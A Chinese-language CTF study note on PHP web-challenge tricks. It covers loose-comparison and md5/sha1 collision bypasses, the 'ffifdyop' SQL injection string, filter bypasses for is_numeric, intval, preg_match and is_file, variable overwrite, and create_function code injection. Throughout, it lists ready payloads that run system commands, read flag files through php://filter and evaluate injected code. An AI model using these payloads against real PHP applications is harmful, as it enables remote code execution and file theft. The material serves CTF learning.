echo new Error(system('cat flag'));
echo new DirectoryIterator("glob:///*");
echo new FilesystemIterator(getcwd());
```

### 强比较

![image.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1714729399340-a0b309fb-3948-45b6-b16a-4ea01873211c.png)

### 弱比较

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661543655-ce705e76-7b14-4337-a906-3187fa84199a.png)

  

[http://php.net/manual/zh/types.comparisons.php](http://php.net/manual/zh/types.comparisons.php)

  

<details open>
<summary>[php弱类型比较及绕过](https://blog.csdn.net/weixin_45349299/article/details/127983551?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170047572716800197064748%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170047572716800197064748&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127983551-null-null.142^v96^pc_search_result_base3&amp;utm_term=php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83&amp;spm=1018.2226.3001.4187)</summary>

</details>

  

```php
<?php
var_dump("5.php"==5);//bool(true)
var_dump(1=="1");     //bool(true)
var_dump(123=='123asd');  //bool(true)
var_dump("1"==true);    //bool(true)
var_dump("0"==false);   //bool(true)
var_dump(-1 == true);   //bool(true)
var_dump(true=="php");   //bool(true)
var_dump(0==NULL);     //bool(true)
var_dump(0=="php");    //bool(true)
var_dump(0=="");      //bool(true)
var_dump(NULL==false);   //bool(true)
var_dump(""==false);    //bool(true)
var_dump(array()==false); //bool(true)
var_dump(array()==NULL);  //bool(true)
var_dump(0e566==0e123);  //bool(true)
?>
```

  

在PHP中遇到数字与字符串进行松散比较()时，会将字符串中前几位是数字且数字后面**不是”."，“e"或"E"**的子串转化为数字，与数字进行比较，如果相同则返回为true，不同返回为false，后面的所有字符串直接截断扔掉：

  

```php
var_dump(123==‘123.5asd1234’);//输出为false
var_dump(123==‘123e5asd1234’);//输出为false
var_dump(123==‘123E5asd1234’);//输出为false
```

  

如果字符串数字后面是**”." , “e”, “E”**，则会有其他结果。  
**"."**为浮点数的标志，会将字符串的子串转化为浮点数。  
**"e"**和**"E"**为科学计数法的标志，将字符串的子串转化为科学计数法。  
所以比较出错。

  

### md5

  

> md5(string,raw)
> 
> string:要计算的字符串。  
> raw:可选。
> 
> -   默认不写为FALSE。32位16进制的字符串
> -   TRUE。16位原始二进制格式的字符串

  

#### SQL注入中的md5

  

万能密码`ffifdyop`

  

```sql
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b

字符串 ffifdyop 经过 md5 编码后返回的原始二进制为 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c，相当于构造了
select * from 'admin' where password= '' or  '6\xc9]\x99\xe9!r,\xf9\xedb\x1c'
即
select * from 'admin' where password= '' or  true
```

  

在mysql里面，在用作布尔型判断时，以`1开头(数字开头都是可以的)`的字符串会被当做整型数。要注意的是这种情况是必须要有`单引号`括起来的，比如`password=‘xxx’ or ‘1xxxxxxxxx’`，那么就相当于`password=‘xxx’ or 1`，也就相当于`password=‘xxx’ or true`，所以返回值就是true。  
所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有`‘or’6`这一部分的字符。

  

<details open>
<summary>[来源](https://blog.csdn.net/March97/article/details/81222922?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164722646016780271951898%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164722646016780271951898&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-81222922.pc_search_result_cache&amp;utm_term=md5%28%24pass%2Ctrue%29%E6%BC%8F%E6%B4%9E&amp;spm=1018.2226.3001.4187)</summary>

</details>

  

#### md5比较

##### 弱比较

```php
<!-- $a = $GET['a']; $b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

重点在于 `$a != $b && md5($a) == md5($b)`

1.  利用数组绕过  
    `a[]=1&b[]=2`由于 md5 函数哈希数组会返回`NULL`，故只需传入不同的数组即可
2.  利用0e科学计数法即可绕过即可(0×10的x次方，都是为0)

```php
QNKCDZO → 0e830400451993494058024219903391
PJNPDWY
240610708 → 0e462097431906509019562988736854
s878926199a → 0e545993274517709034328855841020
s155964671a → 0e342768416822451524974117254469
s214587387a → 0e848240448830537924465865611904
s1091221200a → 0e940624217856561557816327384675
s1885207154a → 0e509367213418206700842008763514
自身和md5后都是0e开头:0e215962017

MD5加密后两边的值为0e开头的即可
```

##### 强比较

> payload1:`/levels91.php?a[]=1&b[]=2`  
> payload2：`/levels91.php?a=QNKCDZO&b=240610708`

```php
if($_POST['param1']!==$_POST['param2']
&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;}
```

  

数组绕过  
md5无法对数组进行加密，数组的加密返回值均为null

Payload: `param1[]=1&param2[]=2`

  

数字型和字符型绕过

```php
$a = 1;
$b = '1';

echo ($a !== $b)."\n";
echo (md5($a) === md5($b))."\n";
echo (sha1($a) === sha1($b))."\n";
```

  

##### 强碰撞:

```html
array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
--------------------------------------------------------------------
array1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
&array2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
```

  

拼接字符串的md5强比较

```php
$play="weclome GCTf!";
if (is_string($play.$_POST['flag']) && is_string($play.$_POST['f1ag']))
{
  if ($play.$_POST['flag']!==$play.$_POST['f1ag'] && md5($play.$_POST['flag'])===md5($play.$_POST['f1ag']))
  {
    echo "\n";
    echo "good!";
    echo file_get_contents('/flag');

  }
```

[fastcoll_v1.0.0.5.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/39170111/1730124610880-c77b2f7b-8a23-4147-b4f7-2bdeb1d12713.zip)

使用教程:

1.  创建一个a.txt文件，输入拼接的字符串内容
2.  指令fastcoll\_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt

程序运行之后，1.txt和2.txt的内容不同(开头都是自己拼接的字符串)，但是hash值相同

之后用脚本url解码出文件内容

```php
<?php 
function readmyfile($path){
 $fh = fopen($path, "rb");
 $data = fread($fh, filesize($path));
 fclose($fh);
 return $data;
}
$a = urlencode(readmyfile("./1.txt"));
$b = urlencode(readmyfile("./2.txt"));
$aa=urldecode($a);
$bb=urldecode($b);
if ((string)$aa !== (string)$bb && md5($aa) === md5($bb)) {
    echo $a."\n".$b;
}
?>

a=test%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%B1%8C1v%EB%18%A6%F1%86u72%0D%86%9BY%2F%EA%A7%80%1B%1E%FCO%02z%85%13%1E%AF%BA%F2%E5%E3%F5%BC%2B%D0%3E%0BF%D9y%A2%91%F17%B9p_s%A4%88%0DMO%EB%96%B4%27%3A%AE%21%0EY%00%A2%8C%C1%02%BF_h%F3%23%E0J%99%ABM%B8%A7%C7yz%05%0E%12%29%E0FPI%86%9E%09%B0%BF%93%10s%C5G%F24%FD%89%8D%AC%B5%3F%EC%24%05%CDY%B3SM%E6%17%5C%FD%B2Qp%FA&b=test%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%B1%8C1v%EB%18%A6%F1%86u72%0D%86%9BY%2F%EA%27%80%1B%1E%FCO%02z%85%13%1E%AF%BA%F2%E5%E3%F5%BC%2B%D0%3E%0BF%D9y%A2%11%F27%B9p_s%A4%88%0DMO%EB%964%27%3A%AE%21%0EY%00%A2%8C%C1%02%BF_h%F3%23%E0J%99%ABM%B8%A7Gyz%05%0E%12%29%E0FPI%86%9E%09%B0%BF%93%10s%C5G%F24%FD%89%8D%2C%B5%3F%EC%24%05%CDY%B3SM%E6%17%5C%7D%B2Qp%FA
```

  

MD5值相同的文件

```bash
用md5collgen生成两个MD5值相同的文件
首先在md5collgen目录下创建一个prefix.txt文件，输入文件前缀
运行md5collgen工具，用prefix.txt文件作为前缀生成两个具有相同MD5哈希值的不同文件
Linux终端输入：
md5collgen -p prefix.JPG -o out1.jpg out2.jpg
```

### sha1比较

```php
弱比较
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799
```

  

sha1无法处理数组，如下可使用a[]=1&b[]=1数组绕过

```php
if($a==$b){
    if(sha1($a)==sha1($b)){
        echo $flag;
    }
}
```

  

数字型和字符型绕过

```php
$a = 1;
$b = '1';

echo ($a !== $b)."\n";
echo (md5($a) === md5($b))."\n";
echo (sha1($a) === sha1($b))."\n";
```

  

MD5或者sha1这种如果**强制类型转换**后，

就不接受数组了，这个时候就要找真正的编码后相同的了

```plain
sha1碰撞
admin=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&root_pwd=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

  

### PHP双$($$)的变量覆盖

  

```php
$test="a23";    $test等于a23
$$test=456;        $$test也就等于$23,这里相当于给$a23赋值了
echo $test;        正常输出$test为a23
echo $$test;    这里输出$$test，就是$a23，为456
echo $a23;        第二行给$a23赋值了，这里正常输出

foreach ($_POST as $key => $value)
a=b	//$key=a	$value=b
```

  

### `hex2bin()`函数

  

转换十六进制字符串为二进制字符串

  

参数不能带0x

  

### `parse_str()`函数

parse\_str会把字符串解析为变量，大部分是传入的多个值

```php
$a="q=123&p=456";
parse_str($a);
echo $q;                输出123
echo $p;                输出456
parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中
echo $b['q'];            输出123
echo $b['p'];            输出456
```

  

参数名下划线绕过

由于 PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。 用本函数带 result 参数，也会应用同样规则到数组的键名。

```php
$query = $_SERVER['QUERY_STRING'];
parse_str($query);
if (preg_match('/_|%5f|\.|%2E/i',$query)){
    die('听说你是黑客');
}

$O_U_C=$_GET['O_U_C'];
echo $O_U_C;

?O U C=122123		//122123
```

  

parse\_str()会自动进行一次url解码

![QQ_1726407370271.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1726407378864-90ba0f46-edaa-4642-b4be-cf2e1c346f4c.png)

---

### gettext拓展的使用

```php
var_dump(call_user_func($f1,$f2));

如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()
  
<?php
echo gettext("phpinfo");
结果  phpinfo

echo _("phpinfo");
结果 phpinfo
```

### 调用类中的函数

\->用于动态语境处理某个类的某个实例  
::可以调用一个静态的、不依赖于其他初始化的类方法

也就是说双冒号不用实例化类就可以调用类中的静态方法

```php
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
call_user_func($_POST['ctfshow']);

传入ctfshow=ctfshow::getFlag即可
```

### `$GLOBALS`全局变量

$GLOBALS — 引用全局作用域中可用的全部变量  
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

构造出`var_dump($GLOBALS);`可以输出全部变量值，包括自定义

  

### is\_file()函数

在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容

> 绕过is\_file的方法很多,
> 
> data://以外的伪协议, **is\_file**会认为php伪协议**不是**文件,highlight\_file认为伪协议可以**是**文件
> 
> a/../path 在a不存在时,
> 
> 另外is\_file也要依赖于php\_sys\_lstat, 可以用/proc/self/root符号链接嵌套的方式绕过

```php
绕过payload：
 	file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
is_file会认为不是文件
```

  

### `trim()+is_numeric()`

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661543826-5d34a71e-428c-43df-b917-c4de74468d0e.png)

  

```php
//这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字
//跟trim一起测试一下
for ($i=0; $i <=128 ; $i++) { 
    $x=chr($i).'1';
   if(trim($x)!=='1' &&  is_numeric($x)){
        echo urlencode(chr($i))."\n";
   }
}

除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过

if(is_numeric($num) and $num!=='36' and trim($num)!=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}
payload:num=%0c36
```

  

### `is_numeric()`函数

  

> is\_numeric ( [mixed](language.pseudo-types.html#language.types.mixed) `$var` ) : bool
> 
> 如果 `var` 是数字和数字字符串则返回 `**TRUE**`，否则返回 `**FALSE**`。

```plain
is_numeric("0x1234");
在PHP 5下返回true, 在PHP 7下返回false
```

  

> [https://www.php.net/manual/zh/function.is-numeric.php](https://www.php.net/manual/zh/function.is-numeric.php)  
> [https://www.vuln.cn/8198](https://www.vuln.cn/8198)

  

is\_numeric函数对于空字符`%00`，无论是`%00`放在前后都会被判断为`非数值`，而`%20`空格字符只能放在数值后。该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断

  

```php
1 is_numeric函数对于空字符%00，无论是%00放在前后都会被判断为`非数值`，而%20空格字符只能放在数值后。该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断
j=1315%20
j=1315%00

2 当碰到16进制数的时候，也会判断成数字
<?php
echo '传入:admin:'.is_numeric('admin');
echo '传入十六进制后的admin:'.is_numeric('0x61646D696E'); //十六进制转化的admin
?>

3 数组+十六进制来进行绕过
j[]=58B

4 php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过
j=9999a
```

  

### `strcmp()`函数

  

```php
//字符串比较区分大小写
int strcmp ( string $str1 , string $str2 )
```

  

如果 str1 小于 str2 返回 < 0；  
如果 str1 大于 str2 返回 > 0  
如果两者相等，返回 0。  
**当传入其它类型的的时候比如数组（在变量后面加[ ]，**`**money[ ]=1**`**）或者不是字符串的话，类会发生报错信息，同时也会return 0**

  

### `strpos()`函数

strpos() 函数查找字符串在另一字符串中第一次出现的位置。

strpos() 函数对大小写敏感。

该函数是二进制安全的。

```php
相关函数：
stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）
strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）
strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）
```

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661543956-9479e132-74b2-4c51-b7ae-2393e78cc162.png)

```php
%20空格绕过
$num=' 010574';	//八进制
echo strpos($num, "0");	//1
if(!strpos($num, "0")){
        die("no no no!");
    }

利用换行绕过（%0a）
num=4476%0a0
num=%0a010574
  
目录遍历绕过
```
```php
例题：
if(isset($file))
{
 if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index"))
{
  include ($file . '.php');
}
//$file中必须含有woofers,meowers,index中的一项，才能够文件包含file.php
payload有：
 ?category=php://filter/read=convert.base64-encode/woofers/resource=flag
 ?category=php://filter/read=convert.base64-encode/meowers/resource=flag
 ?category=php://filter/read=convert.base64-encode/index/resource=flag
 ?category=php://filter/convert.base64-encode/resource=woofers/../flag
#php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
```

  

### `ereg()`函数

> **ereg** ( string $pattern , string $string [, array &$regs ] ) : int

(PHP 4, PHP 5) PHP5.3废弃

  

ereg()函数在string指定的字符串中搜索pattern指定的字符串，如果找到pattern，则返回true，否则返回false。可选的输入参数regs包含一个由正则表达式中的括号分组的所有匹配表达式的数组。  
搜索对于字母字符区分大小写。

  

存在NULL截断漏洞，当传入的字符串包含**%00**时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数

  

只能处理字符串，遇到数组做参数返回NULL，NULL!==false。

  

如果有strrev() 这种字符串反转函数配合用更好

  

### `is_string()`函数

  

如果 `传入值` 是 [string](language.types.string) 则返回 `**TRUE**`，否则返回 `**FALSE**`。

  

### `file_exists()`函数

  

> (PHP 4, PHP 5, PHP 7)
> 
> file\_exists ( string `$filename` ) : bool
> 
> 检查文件或目录是否存在
> 
> 如果由 `filename` 指定的文件或目录存在则返回 `**TRUE**`，否则返回 `**FALSE**`。

  

### `preg_match()`函数

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544054-7d28f012-770a-4f7b-96ff-476dfb544338.png)

  

[PHP: preg\_match - Manual](https://www.php.net/manual/zh/function.preg-match.php)

  

> **preg\_match()**返回 `pattern` 的匹配次数。 它的值将是0次（不匹配）或1次，因为**preg\_match()**在第一次匹配后 将会停止搜索。[preg\_match\_all()](function.preg-match-all)不同于此，它会一直搜索`subject` 直到到达结尾。 如果发生错误**preg\_match()**返回 `**FALSE**`。

  

```php
1 数组绕过
传入的参数从字符串形式改为数组形式
$a[]='flag.php';
$a=array('flag.php');
$a=['flag.php'];

2 %0a换行绕过
当正则书写不当：（1）.不会匹配换行符（2）非多行模式
如 preg_match("/^.*flag.*$/",$cmd)
preg_match('/^100$/',$O_U_C)//?O U C=100%0a也能匹配
  
3 回溯次数绕过
pcre.backtrack_limit //最大回溯数
preg_match()的回溯次数可以设定，默认是1000000次(中英文次数不同，实测回溯为100w次，5.3.7版本以前是10w次)，这个可以在php.ini中查询
在正则匹配当中，如果存在符号 " .*? " ，那么匹配的时候便会使用非贪婪模式。非贪婪模式匹配原理简单来说就是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配。
如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。
利用python语言编写回溯绕过一百万次的脚本

4 大小写绕过
模式分隔符后写i，表示这是一个大小写不敏感的搜索，例"/php/i"可匹配PHP
  

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
} 
utils.php/%80绕过
```

  

### `strlen()`函数

  

> (PHP 4, PHP 5, PHP 7)
> 
> strlen ( string `$string` ) : int
> 
> 成功则返回字符串 `string` 的长度；如果 `string` 为空，则返回 0。

  

```php
科学记数法
strlen($_GET[‘password’]) < 8 && $_GET[‘password’] > 9999999
payload：password=1e8
  
  
用get传参
?get=eval($_GET[6]);&6=system('cat /f*');
```

  

### `in_array()`函数

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544150-81b55361-71f7-4092-8989-99fe946d274c.png)

  

> 如果第三个参数没有被设置或者设置为false时，那么从haystack比较needle时，采用的就是**弱类型**比较。
> 
> 如果 `needle` 是字符串，则比较是区分大小写的。

  

```php
#以下，'7eee'被强制转换成整型 7
var_dump(in_array('7eee', [1, 2, 7, 9]));//true
 
#如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。
var_dump(in_array('7eee', [1, 2, 7, 9], true));//false

$v = in_array(0, array('s'));
var_dump($v);//bool(true)	0=='s'//true
```

  

### `intval()`函数

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544265-a9a0b63d-9936-4bb7-9017-f4805cec7ce1.png)

  

如果 base 是 0，通过检测 var 的格式来决定使用的进制：  
◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，  
◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，  
◦ 将使用 10 进制 (decimal)。

  

成功时返回 `var` 的 integer 值，失败时返回 0。 **intval()不能用于object,否则会产生E\_NOTICE错误并返回1(num[])。 空的 array 返回 0(array())，非空的 array 返回 1(array('foo', 'bar'))。**

  

```php
绕过：
 传入数组
intval('4476.0')===4476    小数点  
intval('+4476.0')===4476   正负号
intval('4476e0')===4476    科学计数法
intval('0x117c')===4476    16进制
intval('010574')===4476    8进制
intval(' 010574')===4476   8进制+空格
intval('12345a')=='12345'
intval('12345.1')=='12345'
```
```php
if(intval($num) < 2020 && intval($num + 1) > 2021)
```

在不加1的情况下`"1e10"`会被认为是字符串，然后intval(“1e10”)后就是1

然后字符串`"1e10"`+`1`，`"1e10"`会自动转换成整数，即1乘10的10次方再加上1

所以payload:

```php
?num=1e10
```

这个题只能在**php5**的环境下实现，  
因为在php7里，intval(“1e10”)会被自动转换成10的10次方

  

**返回0**

所以需要参数为空，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。

```python
#usleep()函数
usleep没有返回值
usleep(usleep()) -> usleep没有返回值。
所以intval参数为空，失败返回0

#getdate()函数
返回结果是array，参数必须是int型。
getdate(getdate())---->getdate(array型)--->失败返回flase，intval为0

#systen()函数
成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system('FLASE')，空指令，失败返回FLASE。

#md5()函数
md5(md5())	#string(32) "d41d8cd98f00b204e9800998ecf8427e"
```

### `highlight_file()`

  

highlight\_file的参数可以是路径的

  

```php
if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }

if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：
  
/var/www/html/flag.php              //绝对路径
./flag.php                          //相对路径
php://filter/resource=flag.php      //php伪协议,highlight_file认为伪协议可以是文件
```

  

### $\_SERVER

[php预定义变量~$_SERVER[‘QUERY_STRING‘\] - 柳~ - 博客园](https://www.cnblogs.com/zhiliu/p/16474321.html)

```php
案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root
$_SERVER['PHP_SELF'] 	得到：/php/index.php/test/foo
$_SERVER['REQUEST_URI'] 得到：/php/index.php/test/foo?username=root

    $_SERVER['REQUEST_URI']不会将参数中的特殊符号进行转换，
    也就是说它获取到的url上面的值，不会进行url解码

$a=$_SERVER['argv'];
var_dump($a);	//?a=flag			array(1) { [0]=> string(14) "a=flag" }

$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']
query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据
$a=$_SERVER['argv']; 
GET?$fl0g=flag_give_me;
POST：
CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])
```

  

### 变量覆盖

#### 函数

```php
#extract
extract($array)： 从数组中将变量导入到当前的符号表。可以实现变量覆盖。
如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。
parse_str($_SERVER['QUERY_STRING']);
var_dump($_POST);//把_POST看作参数名用GET传参
传入?_POST[a]=dotast	//array(1) { ["a"]=> string(6) "dotast" }，
再使用extract函数，就会变成$a=dotast
  
#parse_str
parse_str($str)：将字符串解析变量。
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
##将字符串变为数组
$_POST='123';
@parse_str($_SERVER['QUERY_STRING']);//?_POST[a]=2&_POST[b]=3
var_dump($_POST);//array(2) { ["a"]=> string(1) "2" ["b"]=> string(1) "3" } 

#eval、assert
eval('$a="333";');
assert('$a="333";');
```

#### $\_REQUESTS

POST变量覆盖GET变量

### `basement()`函数

  

返回路径中的文件名部分

  

在使用默认语言环境设置时，`basename()` 会删除文件名开头的非 ASCII 字符和中文，这可以用来通过上面的正则过滤

  

### `parse_url()`函数

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661544361-00ec9eaf-55a7-447a-9c8d-c363eb975a8b.png)

  

### `create_function`函数

  

```php
create_function(传入的参数，执行函数）
内在的运行逻辑：
function(参数）{
执行函数；
}
  
create_function('$dotast','echo $dotast."very cool"')
//等于
function f($dotast){
    echo $dotast."very cool";
} 

/*利用如下
如果我们第二个参数输入的是'echo 111;}phpinfo();//'
即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用//注释掉后边的语句
也就是下面这个结构
*/
function f($dotast){
    echo 111;
}
phpinfo();//}

```

  

```php
<?php
if(preg_match('/^[a-z0-9_]*$/isD',$a)){
    show_source(__FILE__);
}
else{
    $a('',$b);
}

payload:
?a=\create_function&b=}system('tac /flag');//	(/*)
\绕过正则匹配，}用来闭合前面的函数

正则表达式我们可以用\进行绕过，正好\在php里代表默认命名空间
php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 
普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；
而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。
如果你在其他namespace里调用系统类，必须使用绝对路径的写法
```

### `call_user_func()`函数

把括号内第一个参数作为回调函数调用，其余参数是回调函数的参数。

回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。call\_user\_func(类::类中方法)

```php
<?php
$b = base64_encode('<?=`tac *`;');
$b = str_replace("=","",$b);
echo "base64加密后:".$b."\n";
$a = call_user_func('bin2hex',$b);
echo "16进制形式:".$a."\n";
var_dump(is_numeric($a));

/*运行结果
base64加密后:PD89YHRhYyAqYDs
16进制形式:504438395948526859794171594473
bool(true)
*/
```
```php
<?php

class myclass {
    static function say_hello()
    {
        echo "Hello!\n";
    }
}
$classname = "myclass";

#数组
## POST:	ctfshow[]=myclass&ctfshow[]=say_hello
